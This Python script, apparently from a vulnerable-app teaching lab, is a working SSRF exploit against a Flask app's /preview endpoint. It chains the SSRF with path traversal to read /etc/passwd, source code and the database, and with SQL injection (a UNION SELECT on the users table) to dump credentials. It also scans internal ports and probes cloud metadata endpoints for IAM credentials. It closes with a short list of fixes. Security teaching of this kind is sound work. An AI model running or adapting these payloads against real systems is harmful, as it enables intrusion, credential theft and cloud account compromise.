#!/usr/bin/env python3
"""
SSRF -- Server-Side Request Forgery
=====================================

this script turns the server itself into an attack proxy
the /preview endpoint fetches any URL the user provides with no validation
so we can make the server request its own internal endpoints, scan ports,
chain with other vulnerabilities, and even reach cloud metadata services

unlike other attacks where we hit the app directly, SSRF is indirect:
the attacker tells the server "fetch this URL for me" and the server obeys
this bypasses firewalls because the request comes from the server's own IP
not from the attacker's machine

what makes this app's SSRF especially dangerous:
  1. no URL validation -- accepts any scheme, host, port
  2. forwards the user's session cookies with the request
     so internal requests to localhost:5000 are AUTHENTICATED
  3. follows redirects (allow_redirects=True)
  4. shows response headers (leaks internal service info)

the script demonstrates 6 attack phases:
  phase 1: confirm SSRF works by fetching localhost
  phase 2: access internal endpoints through the server
  phase 3: chain SSRF with LFI to read system files via the server
  phase 4: chain SSRF with SQLi to dump credentials via the server
  phase 5: scan internal ports to map hidden services
  phase 6: attempt cloud metadata theft (AWS/GCP/Azure)

usage:
    python3 scripts/ssrf.py
    python3 scripts/ssrf.py --target http://127.0.0.1:5000
"""

import argparse
import re
import sys
import time
import html as html_lib

try:
    import requests
except ImportError:
    print("Run: pip install requests")
    sys.exit(1)


# ──────────────────────────────────────────────
# config
# ──────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:5000"
ATTACKER_USER = "ssrf_" + str(int(time.time()))[-6:]
ATTACKER_PASS = "ssrf_probe_2026"


# ──────────────────────────────────────────────
# terminal colors
# ──────────────────────────────────────────────

class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    CN = "\033[96m"; B = "\033[1m"; D = "\033[2m"
    M = "\033[95m"; X = "\033[0m"

def banner(t):
    print(f"\n{C.B}{'=' * 62}\n  {t}\n{'=' * 62}{C.X}")

def ok(m):   print(f"  {C.G}[+]{C.X} {m}")
def fail(m): print(f"  {C.R}[-]{C.X} {m}")
def info(m): print(f"  {C.CN}[*]{C.X} {m}")
def warn(m): print(f"  {C.Y}[!]{C.X} {m}")

def is_login_page(text):
    return "<title>Login</title>" in text and 'name="username"' in text


def ssrf_fetch(session, target, url_to_fetch):
    """sends a POST to /preview with our target URL and parses the response
    
    the /preview endpoint fetches whatever URL we give it and shows the result
    we parse three things from the HTML response:
      - the HTTP status code of the fetched URL
      - the content/body that was fetched
      - any error messages if the fetch failed
    
    returns (status_code, content, raw_html)"""
    resp = session.post(f"{target}/preview",
                        data={"url": url_to_fetch},
                        timeout=15)
    
    # check if our own session expired
    if is_login_page(resp.text):
        return None, None, resp.text
    
    # extract the status code the server got when it fetched our URL
    status_match = re.search(r'Response:</span>\s*<span[^>]*>\s*(\d+)\s*</span>', resp.text)
    fetched_status = int(status_match.group(1)) if status_match else None
    
    # extract the content the server fetched
    # this is in a <pre> block inside a specific styled div
    content_match = re.search(
        r'<div style="background:#0d1117; border:1px solid #30363d; border-radius:8px; padding:1rem; margin-top:0\.5rem.*?<pre[^>]*>(.*?)</pre>',
        resp.text, re.DOTALL
    )
    content = html_lib.unescape(content_match.group(1).strip()) if content_match else None
    
    # if there was an error (connection refused, timeout, etc), extract that instead
    error_match = re.search(r'Request Failed.*?<pre[^>]*>(.*?)</pre>', resp.text, re.DOTALL)
    if error_match and content is None:
        content = f"ERROR: {html_lib.unescape(error_match.group(1).strip())}"
    
    return fetched_status, content, resp.text


# ──────────────────────────────────────────────
# phase 0 -- authenticate (same as every script)
# ──────────────────────────────────────────────

def phase0_auth(session, target):
    banner("PHASE 0 -- Authenticate")
    info(f"Creating throwaway account: '{ATTACKER_USER}'")

    try:
        resp = session.post(f"{target}/register", data={
            "username": ATTACKER_USER,
            "password": ATTACKER_PASS,
            "confirm": ATTACKER_PASS,
        }, allow_redirects=True, timeout=5)

        if is_login_page(resp.text):
            resp = session.post(f"{target}/login", data={
                "username": ATTACKER_USER,
                "password": ATTACKER_PASS,
            }, allow_redirects=True, timeout=5)
            if is_login_page(resp.text):
                fail("Authentication failed")
                return False

        ok(f"Authenticated as '{ATTACKER_USER}'")
        return True
    except requests.exceptions.ConnectionError:
        fail(f"Cannot connect to {target}")
        return False


# ──────────────────────────────────────────────
# phase 1 -- confirm SSRF works
# we test two URLs:
#   - an external URL to see if the server makes outbound requests at all
#   - a localhost URL to confirm we can reach internal services
# if localhost works, we have SSRF
# ──────────────────────────────────────────────

def phase1_confirm(session, target):
    banner("PHASE 1 -- Confirm SSRF")
    info("Testing if the server fetches URLs on our behalf...\n")

    # first test with an external URL to see the server's outbound IP
    info(f"External URL: https://httpbin.org/ip")
    status, content, _ = ssrf_fetch(session, target, "https://httpbin.org/ip")
    if status == 200 and content:
        ok(f"Server fetched external URL (status {status})")
        ip_match = re.search(r'"origin":\s*"([\d.]+)"', content)
        if ip_match:
            ok(f"Server's external IP: {C.Y}{ip_match.group(1)}{C.X}")
    elif content and "ERROR" in content:
        # external fetch might fail due to network restrictions
        # but localhost is what really matters
        warn(f"External fetch failed: {content[:80]}")
        info("Continuing with localhost tests...\n")
    
    # the critical test: can we reach localhost through the server?
    # if the server fetches its own login page, SSRF is confirmed
    info(f"Internal URL: http://127.0.0.1:5000/login")
    status, content, _ = ssrf_fetch(session, target, "http://127.0.0.1:5000/login")
    if content and "<title>Login</title>" in content:
        ok(f"SSRF confirmed! Server fetched its own login page")
        ok("The server is making requests to itself on our behalf")
        return True
    else:
        fail("Could not fetch localhost -- SSRF may not work")
        return False


# ──────────────────────────────────────────────
# phase 2 -- access internal endpoints
# we use SSRF to visit various endpoints through the server
# some of these might be firewalled from outside but accessible from localhost
# ──────────────────────────────────────────────

def phase2_internal_access(session, target):
    banner("PHASE 2 -- Access Internal Endpoints via SSRF")
    info("The server fetches its own endpoints -- some may bypass auth.\n")

    endpoints = [
        ("http://127.0.0.1:5000/",            "Welcome page"),
        ("http://127.0.0.1:5000/notes",        "Notes listing"),
        ("http://127.0.0.1:5000/search?q=admin", "Search results"),
        ("http://127.0.0.1:5000/files",        "File listing"),
        ("http://127.0.0.1:5000/ping",         "Ping tool"),
        ("http://localhost:5000/settings",      "Settings page"),
    ]

    for url, desc in endpoints:
        status, content, _ = ssrf_fetch(session, target, url)

        if status and content:
            # check if the server's internal request got past the auth wall
            if "<title>Login</title>" in (content or ""):
                info(f"  {desc:<20} -> {C.D}redirected to login{C.X}")
            else:
                size = len(content) if content else 0
                ok(f"  {desc:<20} -> {C.G}status {status}{C.X}, {size} bytes")
        else:
            fail(f"  {desc:<20} -> no response")


# ──────────────────────────────────────────────
# phase 3 -- chain SSRF with LFI
# instead of the attacker hitting /download directly,
# we make the SERVER hit its own /download with path traversal payloads
# the server requests itself and returns the file content to us
#
# this is powerful because even if /download is firewalled from outside,
# the server can still reach it from localhost
# ──────────────────────────────────────────────

def phase3_chain_lfi(session, target):
    banner("PHASE 3 -- Chain SSRF + LFI")
    info("Using SSRF to trigger the LFI vulnerability internally.\n")
    info("The attacker never touches /download directly --")
    info("the SERVER makes the request to itself.\n")

    lfi_targets = [
        ("../../etc/hostname",           "Server hostname"),
        ("../../etc/passwd",             "System users (via SSRF->LFI)"),
        ("../../app.py",                 "App source code (SECRET_KEY)"),
        ("../../instance/notes.db",      "Database file"),
    ]

    for path, desc in lfi_targets:
        url = f"http://127.0.0.1:5000/download?file={path}"
        info(f"  SSRF -> {C.R}{url}{C.X}")
        
        status, content, _ = ssrf_fetch(session, target, url)
        
        if status == 200 and content:
            if "Error:" in content or "<title>Login</title>" in content:
                fail(f"  {desc:<35} -> blocked or redirected")
            else:
                preview = content[:80].replace('\n', ' ')
                ok(f"  {desc:<35} -> {C.Y}{preview}...{C.X}")
                
                # highlight SECRET_KEY if we found it -- this is the crown jewel
                if "SECRET_KEY" in content:
                    key_match = re.search(r"SECRET_KEY.*?=.*?['\"](.+?)['\"]", content)
                    if key_match:
                        warn(f"  {C.R}SECRET_KEY leaked: {key_match.group(1)}{C.X}")
        else:
            fail(f"  {desc:<35} -> not found")


# ──────────────────────────────────────────────
# phase 4 -- chain SSRF with SQL injection
# we make the server send SQL injection payloads to its own /search endpoint
# even if /search were blocked by WAF from outside, SSRF bypasses that
# ──────────────────────────────────────────────

def phase4_chain_sqli(session, target):
    banner("PHASE 4 -- Chain SSRF + SQL Injection")
    info("Using SSRF to trigger SQL injection on the /search endpoint.\n")
    info("Even if /search were firewalled from outside,")
    info("SSRF lets us reach it through the server.\n")

    # first a simple ' OR 1=1 -- to confirm injection works through SSRF
    payload = "' OR 1=1 --"
    url = f"http://127.0.0.1:5000/search?q={payload}"
    info(f"  SSRF -> {C.R}{url}{C.X}")

    status, content, _ = ssrf_fetch(session, target, url)
    
    if content and "Found" in content:
        count_match = re.search(r'Found.*?(\d+).*?result', content)
        if count_match:
            ok(f"  SQLi via SSRF worked! {C.Y}{count_match.group(1)}{C.X} results dumped")

    # now escalate to UNION SELECT to dump credentials
    payload2 = "' UNION SELECT 0,username,password,role,0 FROM users --"
    url2 = f"http://127.0.0.1:5000/search?q={payload2}"
    info(f"  SSRF -> {C.R}UNION SELECT ... FROM users{C.X}")

    status, content, _ = ssrf_fetch(session, target, url2)

    if content:
        # look for known usernames in the response to confirm the dump worked
        users_found = re.findall(r'(admin|potato)', content)
        if users_found:
            ok(f"  Credentials visible in SSRF response: {C.Y}{', '.join(set(users_found))}{C.X}")
            warn("  Full SQLi attack chain works through SSRF!")


# ──────────────────────────────────────────────
# phase 5 -- internal port scan
# we use SSRF to scan localhost ports that are invisible from outside
# the error messages tell us which ports are open vs closed:
#   "Connection refused" = port exists but nothing is listening
#   HTTP response        = port is open and serving content
#   timeout              = port might be filtered by firewall
# ──────────────────────────────────────────────

def phase5_port_scan(session, target):
    banner("PHASE 5 -- Internal Port Scan via SSRF")
    info("Using the server as a proxy to scan localhost ports.\n")
    info("The attacker cannot reach these ports directly --")
    info("but the server can, and reports back.\n")

    # common service ports to check
    common_ports = [
        (22,    "SSH"),
        (80,    "HTTP"),
        (443,   "HTTPS"),
        (3306,  "MySQL"),
        (5432,  "PostgreSQL"),
        (6379,  "Redis"),
        (8080,  "HTTP Alt"),
        (8888,  "Jupyter"),
        (9200,  "Elasticsearch"),
        (27017, "MongoDB"),
        (5000,  "Flask (this app)"),
    ]

    open_ports = []

    for port, service in common_ports:
        url = f"http://127.0.0.1:{port}/"
        status, content, raw = ssrf_fetch(session, target, url)

        if content and "ERROR:" in content:
            if "Connection refused" in content or "ConnectionError" in content:
                # nothing is listening on this port
                info(f"  Port {port:<5} ({service:<15}) -> {C.D}closed{C.X}")
            elif "Timeout" in content:
                # port might exist but is firewalled
                info(f"  Port {port:<5} ({service:<15}) -> {C.D}filtered{C.X}")
            else:
                warn(f"  Port {port:<5} ({service:<15}) -> {C.Y}error: {content[:50]}{C.X}")
        elif status:
            # got an HTTP response -- port is open and serving content
            ok(f"  Port {port:<5} ({service:<15}) -> {C.G}OPEN (status {status}){C.X}")
            open_ports.append((port, service))
        else:
            info(f"  Port {port:<5} ({service:<15}) -> {C.D}no response{C.X}")

    print(f"\n  {C.B}{len(open_ports)} open port(s) found{C.X}")
    return open_ports


# ──────────────────────────────────────────────
# phase 6 -- cloud metadata endpoint
# the most famous real-world SSRF attack: Capital One breach (2019)
# AWS/GCP/Azure instances have a special IP (169.254.169.254) that serves
# instance metadata including IAM credentials
# if the server is running in the cloud, SSRF can steal these credentials
# and the attacker gets access to the entire cloud account
# ──────────────────────────────────────────────

def phase6_cloud_metadata(session, target):
    banner("PHASE 6 -- Cloud Metadata Endpoint (Simulated)")
    info("In a real cloud environment (AWS/GCP/Azure), the attacker")
    info("would request the metadata service to steal credentials.\n")

    cloud_urls = [
        ("http://169.254.169.254/latest/meta-data/",          "AWS Instance Metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/",      "AWS IAM Credentials"),
        ("http://metadata.google.internal/computeMetadata/v1/","GCP Metadata"),
    ]

    info("Testing cloud metadata endpoints:\n")
    for url, desc in cloud_urls:
        status, content, _ = ssrf_fetch(session, target, url)

        if content and "ERROR:" in content:
            info(f"  {desc:<30} -> {C.D}not reachable (not in cloud){C.X}")
        elif status == 200:
            # if this returns 200, we are in a real cloud environment
            # and we just stole instance metadata or IAM credentials
            warn(f"  {desc:<30} -> {C.R}ACCESSIBLE! Cloud credentials at risk!{C.X}")
        else:
            info(f"  {desc:<30} -> {C.D}not reachable{C.X}")

    print()
    info("This machine is not in a cloud environment, so these fail.")
    info("But on AWS/GCP/Azure, this is how credentials get stolen.")
    info("The 2019 Capital One breach used exactly this technique.")


# ──────────────────────────────────────────────
# summary
# ──────────────────────────────────────────────

def print_summary():
    banner("ATTACK SUMMARY -- SSRF")
    print(f"""
  {C.B}What SSRF enabled:{C.X}

  +----------------------------------------------------------+
  |  The attacker used /preview to make the SERVER fetch      |
  |  URLs -- turning the server into a proxy/attack tool.     |
  +----------------------------------------------------------+

  {C.B}Attacks demonstrated:{C.X}

    1. {C.Y}Internal Access{C.X}
       Reached localhost endpoints that may be firewalled externally

    2. {C.Y}SSRF -> LFI Chain{C.X}
       Server exploited its own /download path traversal
       Read /etc/passwd, app.py (SECRET_KEY), database file

    3. {C.Y}SSRF -> SQLi Chain{C.X}
       Server exploited its own /search SQL injection
       Dumped credentials through the SSRF proxy

    4. {C.Y}Port Scanning{C.X}
       Used the server to scan internal ports (22, 3306, 6379...)
       Mapped internal services invisible from outside

    5. {C.Y}Cloud Metadata{C.X}
       Attempted AWS/GCP metadata endpoints
       (Would steal cloud credentials in a real cloud environment)

  {C.Y}SSRF vs other attacks:{C.X}

    LFI:          Attacker reads files directly
    Cmd Injection: Attacker runs commands directly
    SQLi:         Attacker queries DB directly
    SSRF:         Attacker makes the SERVER do all of the above
                  Bypasses firewalls, IP allowlists, network segmentation

  {C.Y}Fix:{C.X}

    {C.G}1. URL allowlist:{C.X}
       ALLOWED_DOMAINS = ["example.com", "api.github.com"]
       if parsed.hostname not in ALLOWED_DOMAINS: reject

    {C.G}2. Block internal IPs (with DNS resolution first):{C.X}
       ip = socket.gethostbyname(hostname)
       if ipaddress.ip_address(ip).is_private: reject

    {C.G}3. Block dangerous protocols:{C.X}
       if parsed.scheme not in ("http", "https"): reject

    {C.G}4. Never forward cookies with server-side requests{C.X}

    {C.G}5. Disable redirect following (allow_redirects=False){C.X}
""")


# ──────────────────────────────────────────────
# main
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="SSRF -- Server-Side Request Forgery")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    args = parser.parse_args()
    target = args.target.rstrip("/")

    print(f"""
{C.B}{C.M}
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
{C.X}
  {C.D}Server-Side Request Forgery -- The Server as a Proxy{C.X}
  {C.D}Target: {target}{C.X}
""")

    session = requests.Session()

    if not phase0_auth(session, target):
        sys.exit(1)

    if not phase1_confirm(session, target):
        fail("SSRF confirmation failed -- is /preview endpoint in app.py?")
        sys.exit(1)

    phase2_internal_access(session, target)
    phase3_chain_lfi(session, target)
    phase4_chain_sqli(session, target)
    phase5_port_scan(session, target)
    phase6_cloud_metadata(session, target)
    print_summary()


if __name__ == "__main__":
    main()
